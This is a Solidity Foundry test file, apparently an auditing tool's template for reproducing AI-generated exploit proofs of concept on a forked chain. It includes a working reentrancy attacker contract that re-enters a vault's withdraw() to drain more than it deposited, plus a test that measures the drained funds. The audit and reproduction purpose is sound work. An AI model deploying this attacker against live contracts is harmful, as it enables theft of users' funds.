// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title SmartKontrakt Fork PoC — TEMPLATE
/// @notice Runnable reference harness for the AI-generated exploit PoC.
/// @dev Run ONLY against a fork (see scripts/run-fork-poc.sh). No real
///      transactions, no private keys, no mainnet writes — ever.
///
/// HOW TO USE:
///   1. Set POC_TARGET to the contract under audit.
///   2. Set POC_FORK_BLOCK to pin the fork (0 = latest).
///   3. Run: POC_TARGET=0x... ./scripts/run-fork-poc.sh 0x...
///   4. Adapt test_exploitTemplate() to the finding: replace IVictim with
///      the target's real interface and the attacker flow with the
///      AI-generated exploit (the AI tab's Foundry test is the starting point).
///
/// READING RESULTS:
///   - test_forkSanity passing  = harness + fork + target are wired correctly.
///   - test_exploitTemplate passing = the exploit reproduced on fork state.
///   - test_exploitTemplate failing = exploit did NOT reproduce (target not
///     vulnerable to this flow, wrong interface, or fork block moved state).

/// @notice Minimal interface of the example vulnerable vault. Replace with
/// the audited contract's real ABI when adapting this template.
interface IVictim {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Attacker contract for the reentrancy example. It deposits, then
/// re-enters `withdraw()` from its receive() until the cap is hit or the
/// victim runs dry. Delete/replace when adapting to another vulnerability.
contract ReentrancyAttacker {
    IVictim public immutable victim;
    uint256 public reentries;
    uint256 public maxReentries;

    constructor(address victim_) {
        victim = IVictim(victim_);
    }

    function attack(uint256 maxReentries_) external payable {
        maxReentries = maxReentries_;
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (reentries < maxReentries && address(victim).balance >= 1 wei) {
            reentries++;
            victim.withdraw();
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        // Target comes from the environment; fail fast with a clear message.
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set: export POC_TARGET=0x... or pass the address to run-fork-poc.sh");

        // 0 = latest block. Pin a block for reproducible PoCs.
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));

        // Fork from the sandbox RPC (local anvil when run via the script,
        // or the "mainnet" alias from foundry.toml when run directly).
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    /// @notice Harness self-check: fork is live and the target has code.
    /// If THIS fails, the problem is the setup (RPC, address, block) — not the exploit.
    /// Note: not `view` — assertGt writes ds-test's `failed` flag, which a
    /// view function may not do.
    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block (wrong address, chain, or block?)");
        console.log("target:", target);
        console.log("target balance:", target.balance);
        console.log("fork block:", block.number);
    }

    /// @notice TEMPLATE exploit: reentrancy drain against IVictim.
    /// TODO (adapt per finding): replace IVictim / attacker with the real
    /// exploit flow from the AI-generated PoC. On a non-vulnerable target
    /// this fails — that is the correct "exploit did not reproduce" signal.
    function test_exploitTemplate() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        ReentrancyAttacker attacker = new ReentrancyAttacker(target);

        uint256 targetBefore = target.balance;
        // Drained funds land in the ATTACKER CONTRACT (it makes the calls),
        // not in the funding EOA — measure profit there.
        uint256 attackerContractBefore = address(attacker).balance;

        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}(3);

        uint256 drained = targetBefore > target.balance ? targetBefore - target.balance : 0;

        console.log("target balance before:", targetBefore);
        console.log("target balance after:", target.balance);
        console.log("drained:", drained);
        console.log("attacker reentries:", attacker.reentries());

        // Draining MORE than the 1 ether deposit proves the reentrancy.
        // On a guarded vault this assertion fails — exploit not reproduced.
        assertGt(drained, 1 ether, "exploit did not reproduce: drained <= deposit (guarded or wrong interface?)");
        assertGt(
            address(attacker).balance,
            attackerContractBefore + 1 ether,
            "attacker contract did not profit beyond its deposit"
        );
    }
}
